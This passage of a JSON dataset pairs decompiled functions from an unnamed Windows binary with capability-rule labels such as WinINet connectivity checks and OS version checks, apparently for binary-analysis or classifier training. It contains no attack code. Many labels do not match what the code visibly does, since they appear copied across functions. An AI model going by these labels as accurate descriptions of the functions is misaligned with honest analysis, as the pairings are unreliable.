            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00052a94(ulong arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    if (*0x879c8 == 0) {\n        fcn.000619f6(0x87c60, arg1, 0x20);\n        uVar2 = fcn.00052608();\n        if (uVar2 == 0) {\n            *0x879c8 = 1;\n            uVar1 = fcn.0005245c(0xc3, 0x50e90, 0x87980, 0x87988);\n            uVar2 = uVar1;\n            if (uVar1 != 0) {\n                fcn.000528d4();\n            }\n        }\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    return uVar2;\n}\n",
        "token_count": 199
    },
    "00052b04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00052b04(ulong noname_0, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    ulong *in_stack_00000028;\n    \n    if (in_stack_00000028 == NULL) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        *in_stack_00000028 = 0;\n        if (arg2 == 0) {\n            uVar1 = 0x21590066;\n        }\n        else if (arg3 == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (arg4 == 0) {\n            uVar1 = 0x21590068;\n        }\n        else if (*0x879c8 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x879c0 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00052a20(noname_0, arg2, arg3, arg4);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 264
    },
    "00052b74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00052b74(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint16_t *puVar8;\n    uint32_t auStack88 [18];\n    uint16_t *puVar9;\n    \n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    uVar7 = 0;\n    puVar8 = arg1 + -8;\n    uVar6 = 0;\ncode_r0x00052ba0:\n    while( true ) {\n        uVar5 = uVar6;\n        puVar9 = puVar8;\n        puVar8 = puVar9 + 4;\n        uVar1 = *puVar8;\n        uVar6 = uVar7;\n        if (0x35 < uVar1) break;\n        if (uVar1 == 0x35) {\n            if (uVar5 < *(puVar9 + 6)) goto code_r0x00052c95;\n            goto code_r0x00052e6b;\n        }\n        if (uVar1 < 0x17) {\n            if (uVar1 == 0x16) {\n                return uVar5;\n            }\n            if (uVar1 < 6) {\n                if (uVar1 == 5) {\n                    uVar6 = *(puVar9 + 6);\n                    goto code_r0x00052c9c;\n                }\n                if (uVar1 == 0) {\n                    uVar6 = *(puVar9 + 6);\n                }\n                else if (uVar1 == 1) {\n                    uVar7 = *(puVar9 + 6);\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 2) {\n                    auStack88[*(puVar9 + 6)] = uVar5;\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 3) {\n                    auStack88[*(puVar9 + 6)] = uVar6;\n                    uVar6 = uVar5;\n                }\n                else {\n                    if (uVar1 != 4) {\n                        return 0;\n                    }\n                    uVar6 = uVar5 + *(puVar9 + 6);\n                }\n            }\n            else {\n                if (uVar1 == 6) {\n                    return *(puVar9 + 6);\n                }\n                if (uVar1 == 7) {\n                    uVar7 = uVar5;\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 0xc) {\n                    uVar6 = uVar5 + uVar6;\n                }\n                else {\n                    if (uVar1 != 0x14) {\n                        if (uVar1 != 0x15) {\n                            return 0;\n                        }\n                        uVar6 = *(puVar9 + 6);\ncode_r0x00052cf1:\n                        if (uVar5 != uVar6) goto code_r0x00052c95;\n                        goto code_r0x00052e6b;\n                    }\n                    uVar6 = uVar5 - *(puVar9 + 6);\n                }\n            }\n        }\n        else if (uVar1 < 0x29) {\n            if (uVar1 == 0x28) {\n                iVar3 = *(puVar9 + 6);\n                goto code_r0x00052df3;\n            }\n            if (uVar1 == 0x1c) {\n                uVar6 = uVar5 - uVar6;\n            }\n            else {\n                if (uVar1 == 0x1d) goto code_r0x00052cf1;\n                if (uVar1 == 0x20) {\n                    iVar3 = *(puVar9 + 6);\n                    goto code_r0x00052cb3;\n                }\n                if (uVar1 != 0x24) {\n                    if (uVar1 != 0x25) {\n                        return 0;\n                    }\n                    if (uVar5 <= *(puVar9 + 6)) goto code_r0x00052c95;\ncode_r0x00052e6b:\n                    uVar2 = *(puVar9 + 5);\n                    goto code_r0x00052c9a;\n                }\n                uVar6 = uVar5 * *(puVar9 + 6);\n            }\n        }\n        else if (uVar1 == 0x2c) {\n            uVar6 = uVar5 * uVar6;\n        }\n        else {\n            if (uVar1 == 0x2d) {\n                if (uVar5 <= uVar6) goto code_r0x00052c95;\n                goto code_r0x00052e6b;\n            }\n            if (uVar1 == 0x30) {\n                if (arg4 <= *(puVar9 + 6)) {\n                    return 0;\n                }\n                iVar3 = *(puVar9 + 6);\n                goto code_r0x00052e58;\n            }\n            if (uVar1 != 0x34) {\n                return 0;\n            }\n            uVar6 = uVar5 / *(puVar9 + 6);\n        }\n    }\n    if (0x60 < uVar1) {\n        if (0x80 < uVar1) {\n            if (uVar1 == 0x81) {\n                uVar7 = arg3;\n                uVar6 = uVar5;\n            }\n            else if (uVar1 == 0x84) {\n                uVar6 = -uVar5;\n            }\n            else if (uVar1 != 0x87) {\n                if (uVar1 != 0xb1) {\n                    return 0;\n                }\n                if (arg4 <= *(puVar9 + 6)) {\n                    return 0;\n                }\n                uVar7 = (*(*(puVar9 + 6) + arg2) & 0xf) << 2;\n                uVar6 = uVar5;\n            }\n            goto code_r0x00052ba0;\n        }\n        uVar6 = arg3;\n        if (uVar1 == 0x80) goto code_r0x00052ba0;\n        if (uVar1 != 0x61) {\n            if (uVar1 == 100) {\n                uVar2 = *(puVar9 + 6);\n            }\n            else {\n                uVar2 = uVar7;\n                if (uVar1 != 0x6c) {\n                    if (uVar1 == 0x74) {\n                        uVar2 = *(puVar9 + 6);\n                    }\n                    else if (uVar1 != 0x7c) {\n                        return 0;\n                    }\n                    uVar6 = uVar5 >> (uVar2 & 0x1f);\n                    goto code_r0x00052ba0;\n                }\n            }\n            uVar6 = uVar5 << (uVar2 & 0x1f);\n            goto code_r0x00052ba0;\n        }\n        uVar7 = auStack88[*(puVar9 + 6)];\n        uVar6 = uVar5;\n        goto code_r0x00052ba0;\n    }\n    if (uVar1 == 0x60) {\n        uVar6 = auStack88[*(puVar9 + 6)];\n        goto code_r0x00052ba0;\n    }\n    if (0x48 < uVar1) {\n        if (uVar1 == 0x4c) {\n            uVar6 = uVar5 | uVar6;\n        }\n        else if (uVar1 == 0x4d) {\ncode_r0x00052e65:\n            if ((uVar6 & uVar5) != 0) goto code_r0x00052e6b;\ncode_r0x00052c95:\n            uVar2 = *(puVar9 + 0xb);\ncode_r0x00052c9a:\n            uVar6 = uVar2;\ncode_r0x00052c9c:\n            puVar8 = puVar8 + uVar6 * 4;\n            uVar6 = uVar5;\n        }\n        else if (uVar1 == 0x50) {\n            iVar3 = uVar6 + *(puVar9 + 6);\n            if (arg4 <= iVar3) {\n                return 0;\n            }\ncode_r0x00052e58:\n            uVar6 = *(iVar3 + arg2);\n        }\n        else if (uVar1 == 0x54) {\n            uVar6 = uVar5 & *(puVar9 + 6);\n        }\n        else {\n            if (uVar1 != 0x5c) {\n                return 0;\n            }\n            uVar6 = uVar5 & uVar6;\n        }\n        goto code_r0x00052ba0;\n    }\n    if (uVar1 == 0x48) {\n        iVar3 = uVar6 + *(puVar9 + 6);\ncode_r0x00052df3:\n        iVar4 = iVar3;\n        if (arg4 < iVar4 + 2U) {\n            return 0;\n        }\n        uVar6 = *(iVar4 + arg2);\n        uVar2 = *(iVar4 + 1 + arg2);\n    }\n    else {\n        if (uVar1 == 0x3c) {\n            if (uVar6 == 0) {\n                return 0;\n            }\n            uVar6 = uVar5 / uVar7;\n            goto code_r0x00052ba0;\n        }\n        if (uVar1 == 0x3d) {\n            if (uVar5 < uVar6) goto code_r0x00052c95;\n            goto code_r0x00052e6b;\n        }\n        if (uVar1 != 0x40) {\n            if (uVar1 != 0x44) {\n                if (uVar1 != 0x45) {\n                    return 0;\n                }\n                uVar6 = *(puVar9 + 6);\n                goto code_r0x00052e65;\n            }\n            uVar6 = uVar5 | *(puVar9 + 6);\n            goto code_r0x00052ba0;\n        }\n        iVar3 = uVar6 + *(puVar9 + 6);\ncode_r0x00052cb3:\n        iVar4 = iVar3;\n        if (arg4 < iVar4 + 4U) {\n            return 0;\n        }\n        uVar6 = CONCAT21(CONCAT11(*(iVar4 + arg2), *(iVar4 + 1 + arg2)), *(iVar4 + 2 + arg2));\n        uVar2 = *(iVar4 + 3 + arg2);\n    }\n    uVar6 = uVar6 << 8 | uVar2;\n    goto code_r0x00052ba0;\n}\n",
        "token_count": 2454
    },
    "00052f48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t fcn.00052f48(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    unkuint3 Var3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint16_t *puVar11;\n    int64_t iVar13;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack104 [18];\n    uint16_t *puVar12;\n    \n    iVar13 = arg4;\n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    uVar6 = in_stack_00000030;\n    uVar10 = 0;\n    puVar11 = arg1 + -8;\n    uVar9 = 0;\ncode_r0x00052f7d:\n    while( true ) {\n        uVar7 = uVar9;\n        puVar12 = puVar11;\n        puVar11 = puVar12 + 4;\n        uVar1 = *puVar11;\n        uVar9 = uVar10;\n        if (0x35 < uVar1) break;\n        if (uVar1 == 0x35) {\n            if (uVar7 < *(puVar12 + 6)) goto code_r0x00053076;\ncode_r0x000532d2:\n            uVar4 = *(puVar12 + 5);\n            goto code_r0x0005307b;\n        }\n        if (uVar1 < 0x17) {\n            if (uVar1 == 0x16) {\n                return uVar7;\n            }\n            if (uVar1 < 6) {\n                if (uVar1 == 5) {\n                    uVar9 = *(puVar12 + 6);\n                    goto code_r0x0005307d;\n                }\n                if (uVar1 == 0) {\n                    uVar9 = *(puVar12 + 6);\n                }\n                else if (uVar1 == 1) {\n                    uVar10 = *(puVar12 + 6);\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 2) {\n                    auStack104[*(puVar12 + 6)] = uVar7;\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 3) {\n                    auStack104[*(puVar12 + 6)] = uVar9;\n                    uVar9 = uVar7;\n                }\n                else {\n                    if (uVar1 != 4) {\n                        return 0;\n                    }\n                    uVar9 = uVar7 + *(puVar12 + 6);\n                }\n            }\n            else {\n                if (uVar1 == 6) {\n                    return *(puVar12 + 6);\n                }\n                if (uVar1 == 7) {\n                    uVar10 = uVar7;\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 0xc) {\n                    uVar9 = uVar7 + uVar9;\n                }\n                else {\n                    if (uVar1 != 0x14) {\n                        if (uVar1 != 0x15) {\n                            return 0;\n                        }\n                        uVar9 = *(puVar12 + 6);\ncode_r0x000530fd:\n                        if (uVar7 != uVar9) goto code_r0x00053076;\n                        goto code_r0x000532d2;\n                    }\n                    uVar9 = uVar7 - *(puVar12 + 6);\n                }\n            }\n        }\n        else if (uVar1 < 0x29) {\n            if (uVar1 == 0x28) {\n                iVar5 = *(puVar12 + 6);\n                if (uVar6 < iVar5 + 2U) {\n                    return 0;\n                }\n                iVar8 = *(puVar12 + 6);\n                iVar2 = *(puVar12 + 6) - arg4;\n                goto code_r0x00053125;\n            }\n            if (uVar1 == 0x1c) {\n                uVar9 = uVar7 - uVar9;\n            }\n            else {\n                if (uVar1 == 0x1d) goto code_r0x000530fd;\n                if (uVar1 == 0x20) {\n                    iVar5 = *(puVar12 + 6);\n                    if (uVar6 < iVar5 + 4U) {\n                        return 0;\n                    }\n                    iVar8 = *(puVar12 + 6);\n                    iVar2 = *(puVar12 + 6) - arg4;\n                    goto code_r0x000530a5;\n                }\n                if (uVar1 != 0x24) {\n                    if (uVar1 != 0x25) {\n                        return 0;\n                    }\n                    if (uVar7 <= *(puVar12 + 6)) goto code_r0x00053076;\n                    goto code_r0x000532d2;\n                }\n                uVar9 = uVar7 * *(puVar12 + 6);\n            }\n        }\n        else if (uVar1 == 0x2c) {\n            uVar9 = uVar7 * uVar9;\n        }\n        else {\n            if (uVar1 == 0x2d) {\n                if (uVar7 <= uVar9) goto code_r0x00053076;\n                goto code_r0x000532d2;\n            }\n            if (uVar1 == 0x30) {\n                iVar8 = *(puVar12 + 6);\n                if (in_stack_00000030 <= iVar8) {\n                    return 0;\n                }\n                goto joined_r0x000532b6;\n            }\n            if (uVar1 != 0x34) {\n                return 0;\n            }\n            uVar9 = uVar7 / *(puVar12 + 6);\n        }\n    }\n    if (0x60 < uVar1) {\n        if (0x80 < uVar1) {\n            if (uVar1 == 0x81) {\n                uVar10 = in_stack_00000028;\n                uVar9 = uVar7;\n            }\n            else if (uVar1 == 0x84) {\n                uVar9 = -uVar7;\n            }\n            else if (uVar1 != 0x87) {\n                if (uVar1 != 0xb1) {\n                    return 0;\n                }\n                iVar8 = *(puVar12 + 6);\n                if (in_stack_00000030 <= iVar8) {\n                    return 0;\n                }\n                if (iVar8 < arg4) {\n                    uVar4 = *(iVar8 + arg2);\n                }\n                else {\n                    uVar4 = *((iVar8 - iVar13) + arg3);\n                }\n                uVar10 = (uVar4 & 0xf) << 2;\n                uVar9 = uVar7;\n            }\n            goto code_r0x00052f7d;\n        }\n        uVar9 = in_stack_00000028;\n        if (uVar1 == 0x80) goto code_r0x00052f7d;\n        if (uVar1 != 0x61) {\n            if (uVar1 == 100) {\n                uVar4 = *(puVar12 + 6);\n            }\n            else {\n                uVar4 = uVar10;\n                if (uVar1 != 0x6c) {\n                    if (uVar1 == 0x74) {\n                        uVar4 = *(puVar12 + 6);\n                    }\n                    else if (uVar1 != 0x7c) {\n                        return 0;\n                    }\n                    uVar9 = uVar7 >> (uVar4 & 0x1f);\n                    goto code_r0x00052f7d;\n                }\n            }\n            uVar9 = uVar7 << (uVar4 & 0x1f);\n            goto code_r0x00052f7d;\n        }\n        uVar10 = auStack104[*(puVar12 + 6)];\n        uVar9 = uVar7;\n        goto code_r0x00052f7d;\n    }\n    if (uVar1 == 0x60) {\n        uVar9 = auStack104[*(puVar12 + 6)];\n        goto code_r0x00052f7d;\n    }\n    if (0x48 < uVar1) {\n        if (uVar1 == 0x4c) {\n            uVar9 = uVar7 | uVar9;\n        }\n        else if (uVar1 == 0x4d) {\ncode_r0x000532cc:\n            if ((uVar9 & uVar7) != 0) goto code_r0x000532d2;\ncode_r0x00053076:\n            uVar4 = *(puVar12 + 0xb);\ncode_r0x0005307b:\n            uVar9 = uVar4;\ncode_r0x0005307d:\n            puVar11 = puVar11 + uVar9 * 4;\n            uVar9 = uVar7;\n        }\n        else if (uVar1 == 0x50) {\n            iVar8 = uVar9 + *(puVar12 + 6);\n            if (in_stack_00000030 <= iVar8) {\n                return 0;\n            }\njoined_r0x000532b6:\n            if (iVar8 < arg4) {\n                uVar9 = *(iVar8 + arg2);\n            }\n            else {\n                uVar9 = *((iVar8 - iVar13) + arg3);\n            }\n        }\n        else if (uVar1 == 0x54) {\n            uVar9 = uVar7 & *(puVar12 + 6);\n        }\n        else {\n            if (uVar1 != 0x5c) {\n                return 0;\n            }\n            uVar9 = uVar7 & uVar9;\n        }\n        goto code_r0x00052f7d;\n    }\n    if (uVar1 == 0x48) {\n        iVar8 = uVar9 + *(puVar12 + 6);\n        iVar5 = iVar8;\n        if (uVar6 < iVar5 + 2U) {\n            return 0;\n        }\n        iVar2 = iVar8 - arg4;\ncode_r0x00053125:\n        if (SBORROW4(iVar8, arg4) == iVar2 < 0) {\n            uVar7 = *((iVar5 - iVar13) + arg3) << 8;\n            uVar9 = *((iVar5 - iVar13) + 1 + arg3);\n        }\n        else {\n            uVar7 = *(iVar5 + arg2) << 8;\n            uVar9 = *(iVar5 + 1 + arg2);\n        }\n    }\n    else {\n        if (uVar1 == 0x3c) {\n            if (uVar9 == 0) {\n                return 0;\n            }\n            uVar9 = uVar7 / uVar10;\n            goto code_r0x00052f7d;\n        }\n        if (uVar1 == 0x3d) {\n            if (uVar7 < uVar9) goto code_r0x00053076;\n            goto code_r0x000532d2;\n        }\n        if (uVar1 != 0x40) {\n            if (uVar1 != 0x44) {\n                if (uVar1 != 0x45) {\n                    return 0;\n                }\n                uVar9 = *(puVar12 + 6);\n                goto code_r0x000532cc;\n            }\n            uVar9 = uVar7 | *(puVar12 + 6);\n            goto code_r0x00052f7d;\n        }\n        iVar8 = uVar9 + *(puVar12 + 6);\n        iVar5 = iVar8;\n        if (uVar6 < iVar5 + 4U) {\n            return 0;\n        }\n        iVar2 = iVar8 - arg4;\ncode_r0x000530a5:\n        if (SBORROW4(iVar8, arg4) == iVar2 < 0) {\n            iVar5 = iVar5 - iVar13;\n            Var3 = CONCAT21(CONCAT11(*(iVar5 + arg3), *(iVar5 + 1 + arg3)), *(iVar5 + 2 + arg3));\n            uVar4 = *(iVar5 + 3 + arg3);\n        }\n        else {\n            Var3 = CONCAT21(CONCAT11(*(iVar5 + arg2), *(iVar5 + 1 + arg2)), *(iVar5 + 2 + arg2));\n            uVar4 = *(iVar5 + 3 + arg2);\n        }\n        uVar9 = uVar4;\n        uVar7 = Var3 << 8;\n    }\n    uVar9 = uVar7 | uVar9;\n    goto code_r0x00052f7d;\n}\n",
        "token_count": 2915
    },
    "0005fd0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005fd0c(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *arg1_01;\n    int32_t iVar1;\n    \n    arg1_00 = *arg1;\n    fcn.0002f23c(0x87c40);\n    iVar1 = fcn.00058f70(arg1_00, 2);\n    if ((iVar1 == 0) || (arg1_01 = *arg1_00,  *(arg1_01 + 4) != 0)) {\n        fcn.0002f2a4(0x87c40);\n        *arg1 = NULL;\n    }\n    else {\n        *(arg1_01 + 4) = 1;\n        fcn.0002f2a4(0x87c40);\n        (**(**arg1_00 + 0x1c))(arg1_00, arg2);\n        fcn.00031198(arg1_01 + 1);\n        fcn.0002f23c(0x87c40);\n        *arg1 = NULL;\n        fcn.00058ef0(arg1_00, 2);\n        fcn.0002f2a4(0x87c40);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00031218(arg1_01 + 1);\n        fcn.0003105c(arg1_01 + 1);\n        fcn.0002f214(arg1_01 + 5);\n        fcn.0002fc50(arg1_01);\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "0005488c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005488c(int64_t arg1, int64_t arg2, ulong arg3, uint8_t **arg4)\n\n{\n    uint8_t uVar1;\n    ulong uVar2;\n    uint8_t **ppuVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint8_t auStackX8 [16];\n    ulong uStackX24;\n    uint8_t **ppuStackX32;\n    int32_t *in_stack_00000028;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    int32_t aiStack152 [2];\n    uint8_t *puStack144;\n    ulong uStack136;\n    ulong uStack128;\n    int64_t *piStack120;\n    uint8_t *puStack112;\n    uint uStack104;\n    int64_t iStack96;\n    ulong uStack88;\n    uint uStack80;\n    \n    uVar6 = 0;\n    puStack144 = NULL;\n    uStackX24 = arg3;\n    ppuStackX32 = arg4;\n    if (*(arg1 + 0x18) == 0) {\n        if (*(arg1 + 0x1c) == 0) {\n            if (*(arg1 + 0x10) == 0) {\n                uStack136 = *(arg1 + 0x48);\n                uStack128 = 0;\n                uVar8 = fcn.0005fa98(arg1 + 0x10, &uStack136, 0, 0);\n                if (uVar8 != 0) {\n                    return uVar8;\n                }\n            }\n            if ((in_stack_00000030 != 0) && (in_stack_00000038 == 0)) {\n                return 0x21590002;\n            }\n            uVar6 = fcn.000600ac(*(arg1 + 0x10), 0);\n            if (uVar6 != 0) {\n                fcn.0005fd0c(arg1 + 0x10, 0);\n                return uVar6;\n            }\n            *(arg1 + 0x1c) = 1;\n        }\n    }\n    else if (*(arg1 + 0x10) == 0) {\n        if ((in_stack_00000030 != 0) && (in_stack_00000038 == 0)) {\n            return 0x21590002;\n        }\n        fcn.0002f23c(arg1 + 0x30);\n        if (*(arg1 + 0x10) == 0) {\n            uVar6 = fcn.0005feb8(*(arg1 + 8), arg1 + 0x10, 0);\n        }\n        fcn.0002f2a4(arg1 + 0x30);\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n    }\n    ppuVar3 = ppuStackX32;\n    uVar2 = uStackX24;\n    uVar8 = 0x21590064;\n    if (arg2 != 0) {\n        fcn.00061a56(&piStack120, 0);\n        puStack112 = auStackX8;\n        piStack120 = &iStack96;\n        auStackX8[0] = 0x94;\n        uStack104 = 1;\n        uStack80 = 0x94;\n        iStack96 = arg2;\n        uStack88 = uVar2;\n        uVar6 = fcn.0006052c(*(arg1 + 0x10), &piStack120, 0);\n        uVar8 = uVar6;\n        if (uVar6 != 0) goto code_r0x00054b43;\n    }\n    if (in_stack_00000030 != 0) {\n        uVar6 = fcn.00060288(*(arg1 + 0x10), &puStack144, aiStack152, in_stack_00000038);\n        puVar4 = puStack144;\n        uVar8 = uVar6;\n        if (uVar6 == 0) {\n            if ((aiStack152[0] < 1) || (uVar1 = *puStack144,  auStackX8[0] = uVar1,  aiStack152[0] < uVar1 + 1)) {\n                uVar8 = 0x2159000a;\n                goto code_r0x00054b43;\n            }\n            *ppuVar3 = puStack144 + uVar1 + 1;\n            uVar5 = uVar1;\n            if (0x94 < uVar1) {\n                uVar5 = 0x94;\n            }\n            *in_stack_00000028 = (aiStack152[0] - uVar1) + -1;\n            uVar7 = uVar5;\n            fcn.000619f6(in_stack_00000030, puStack144 + 1, uVar7);\n            fcn.00061a56(uVar7 + in_stack_00000030, 0, 0x94 - uVar7);\n            if (*in_stack_00000028 == 0) {\n                *ppuStackX32 = NULL;\n            }\n            else {\n                puVar4[uVar1] = uVar1;\n                puStack144 = NULL;\n            }\n        }\n        else if ((uVar6 != 0x21590002) && (fcn.0005fd0c(arg1 + 0x10, 0),  *(arg1 + 0x18) == 0)) {\n            *(arg1 + 0x1c) = 0;\n        }\n    }\n    if (uVar8 == 0) {\n        return uVar8;\n    }\ncode_r0x00054b43:\n    fcn.0005fde8(*(arg1 + 0x10), puStack144);\n    fcn.0005fd0c(arg1 + 0x10, 0);\n    if (*(arg1 + 0x18) == 0) {\n        *(arg1 + 0x1c) = 0;\n    }\n    return uVar8;\n}\n",
        "token_count": 1393
    },
    "00054cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00054cb0(int64_t *arg1, ulong arg2, char *arg3, int64_t arg4)\n\n{\n    uint32_t *arg2_00;\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int16_t *piVar3;\n    uint64_t uVar4;\n    uint64_t arg1_01;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000040;\n    \n    arg1_00 = fcn.0002fbf0(arg2);\n    if (arg1_00 == 0) {\n        return 0x21590004;\n    }\n    fcn.00061a56(arg1_00, 0);\n    *(arg1_00 + 0x130) = 0xffff;\n    if ((arg3 == NULL) || (*arg3 == '\\0')) {\n        piVar3 = 0x15e60;\n        uVar4 = arg1_00 - 0x15e3e;\n        do {\n            iVar1 = *piVar3;\n            *(uVar4 + piVar3) = iVar1;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    else {\n        uVar4 = 0;\n        iVar2 = fcn.00061a0e(arg1_00 + 0x22, 0x40, 0x11f58, arg3);\n        if (iVar2 < 0) {\n            *(arg1_00 + 0xa0) = 0;\n        }\n    }\n    arg2_00 = arg1_00 + 0x128;\n    arg1_01 = arg1_00 + 0xe8;\n    if (arg4 == 0) {\n        fcn.00061620(arg1_01, arg2_00);\n    }\n    else {\n        iVar2 = fcn.00061528(arg4, uVar4 & 0xffffffffffffff00 | in_stack_00000040 & 0xffffffffffffff01, arg1_01, arg2_00\n                            );\n        if (iVar2 != 0) goto code_r0x00054e04;\n    }\n    iVar2 = fcn.00061804(arg1_00 + 0x22, arg1_01, *arg2_00, arg1_00 + 0x10);\n    if (iVar2 == 0) {\n        if ((in_stack_00000030 != 0) &&\n           (iVar2 = fcn.00061528(in_stack_00000030, arg1_01 & 0xffffffffffffff00 | in_stack_00000040 >> 1 & 1, \n                                 arg1_00 + 0xa2, arg1_00 + 0xe4),  iVar2 != 0)) goto code_r0x00054e04;\n        fcn.0005e1d0(arg1_00 + 0x138);\n        iVar2 = 0;\n        *arg1 = arg1_00;\n    }\n    else {\n        iVar2 = fcn.00061a5c(iVar2);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\ncode_r0x00054e04:\n    if (*(arg1_00 + 0x10) != 0) {\n        fcn.000619de();\n    }\n    fcn.0002fc50(arg1_00);\n    return iVar2;\n}\n",
        "token_count": 776
    },
    "000550d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000550d4(int64_t arg1, ulong *arg2, uint *arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong auStackX8 [4];\n    uint32_t in_stack_00000028;\n    uint auStack56 [4];\n    \n    cVar1 = *(arg1 + 0x20);\n    while( true ) {\n        if (cVar1 != '\\0') {\n            return 0x21590006;\n        }\n        iVar2 = fcn.0005e31c(auStackX8, auStack56, arg1 + 0x138, arg4);\n        if (iVar2 == 0) {\n            *arg2 = auStackX8[0];\n            *arg3 = auStack56[0];\n            return 0;\n        }\n        LOCK();\n        *(arg1 + 0x160) = *(arg1 + 0x160) + 1;\n        iVar2 = fcn.0002ee4c(arg1 + 0x150, in_stack_00000028);\n        LOCK();\n        *(arg1 + 0x160) = *(arg1 + 0x160) + -1;\n        if (iVar2 == 0) {\n            return 0x21590002;\n        }\n        if (iVar2 == -1) break;\n        cVar1 = *(arg1 + 0x20);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 323
    },
    "00055960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
